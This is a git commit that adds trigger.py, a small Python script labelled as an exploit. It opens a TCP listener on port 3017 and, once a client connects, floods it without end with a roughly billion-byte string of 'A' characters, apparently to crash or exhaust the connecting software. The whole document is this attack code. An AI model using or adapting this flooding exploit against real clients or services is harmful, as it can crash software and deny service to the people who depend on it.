fc09159b022e9daf1a5a46d9c767109e0da904b6
NskB3 <40596952+NskB3@users.noreply.github.com>
2019-01-02 21:55:05 +0100

    Add files via upload

---
+++ trigger.py
@@ -0,0 +1,25 @@
+import socket
+from socket import *
+import sys
+
+start = "Exploit Started."
+junk = "A"*999999999
+port = 3017
+s = socket(AF_INET, SOCK_STREAM)
+
+def Bind():
+	global c
+	s.bind(("", port))
+	s.listen(5)
+	c, a = s.accept()
+def StartExploit():
+	c.send(start)
+	print(c.recv(65535))
+	count = 0
+	while 1:
+		c.send(junk)
+		count += 999999999
+		sys.stdout.write('\r{} Amount of junk sent.'.format(count))
+		sys.stdout.flush()
+Bind()
+StartExploit()
